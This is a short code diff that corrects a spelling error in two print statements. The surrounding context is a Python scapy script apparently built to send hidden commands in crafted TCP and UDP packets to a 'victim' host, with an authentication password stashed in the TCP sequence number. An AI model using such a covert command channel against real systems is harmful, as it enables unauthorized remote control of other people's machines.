@@ -48,7 +48,7 @@ def craft_tcp_packet(command, victim_ip, attacker_ip, victim_port, attacker_port
     crafted_packet[TCP].seq = auth_password
 
     send(crafted_packet, verbose=False)
-    print("Packet with hiddent command sent!\n")
+    print("Packet with hidden command sent!\n")
 
 
 # Craft a UDP packet and send to server
@@ -60,7 +60,7 @@ def craft_udp_packet(command, victim_ip, attacker_ip, victim_port, encrypted_pas
 
     crafted_packet = ip_packet / udp_packet / command
     send(crafted_packet, verbose=False)
-    print("Packet with hiddent command sent!\n")
+    print("Packet with hidden command sent!\n")
 
 
 # Start client and receive the result back from the server
